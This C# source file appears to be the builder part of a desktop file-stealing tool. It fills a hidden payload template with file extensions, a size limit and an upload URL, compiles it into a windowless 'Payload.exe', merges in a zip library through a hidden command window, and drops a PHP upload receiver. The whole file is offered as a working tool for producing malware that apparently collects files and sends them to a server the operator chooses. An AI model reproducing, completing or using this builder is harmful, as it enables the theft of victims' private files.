using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;
using System.Threading;

namespace DesktopUploader
{
    public class Compiler
    {
        public Compiler(UploaderSettings uploaderSettings)
        {
            InitializeFiles();
            Codedom(uploaderSettings);
            ILMerge();
        }

        private void Codedom(UploaderSettings uploaderSettings)
        {
            string[] referencedAssemblies = new string[] { $"{Environment.CurrentDirectory} \\Temp\\DotNetZip.dll", "System.dll"};
            Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v2.0" } };
            string compilerOptions = "/target:winexe /platform:anycpu /optimize+";

            using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
            {
                CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    OutputAssembly = "Temp//Payload.exe",
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                    TempFiles = new TempFileCollection("Temp", false),
                };

                CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, SourceCode(uploaderSettings));
                if (compilerResults.Errors.Count > 0)
                {
                    foreach (CompilerError compilerError in compilerResults.Errors)
                    {
                        Directory.Delete("Temp", true);
                        throw new Exception(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                            compilerError.Line, compilerError.Column, compilerError.FileName));
                    }
                }
            }
        }

        private string SourceCode(UploaderSettings uploaderSettings)
        {
            string sourceCode = Properties.Resources.SourceCode;
            sourceCode = sourceCode.Replace("@Extensions", string.Join("\",\"", uploaderSettings.Extensions).ToLower());
            sourceCode = sourceCode.Replace("@Size", uploaderSettings.SizeLimit.ToString());
            sourceCode = sourceCode.Replace("@Url", uploaderSettings.Url);
            return sourceCode;
        }

        private void InitializeFiles()
        {
            if (Directory.Exists("Temp"))
                Directory.Delete("Temp", true);
            Thread.Sleep(250);
            Directory.CreateDirectory("Temp");

            File.WriteAllBytes("Temp//DotNetZip.dll", Properties.Resources.DotNetZip);
            File.WriteAllBytes("Temp//ILMerge.exe", Properties.Resources.ILMerge);
            File.WriteAllBytes("Temp//System.Compiler.dll", Properties.Resources.System_Compiler);
            File.WriteAllBytes("uploader.php", Properties.Resources.uploader);
        }

        //inject DotNetZip lib to our payload
        private void ILMerge()
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd",
                Arguments = $"/C ILMerge.exe /ndebug:false /out:{Environment.CurrentDirectory}\\Payload.exe Payload.exe DotNetZip.dll",
                CreateNoWindow = true,
                WorkingDirectory = Environment.CurrentDirectory + "\\Temp",
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden,
            }).WaitForExit(10000);

            if (Directory.Exists("Temp"))
                Directory.Delete("Temp", true);

            if (!File.Exists($"{Environment.CurrentDirectory}\\Payload.exe"))
            {
                throw new Exception("Error");
            }
        }
    }
}
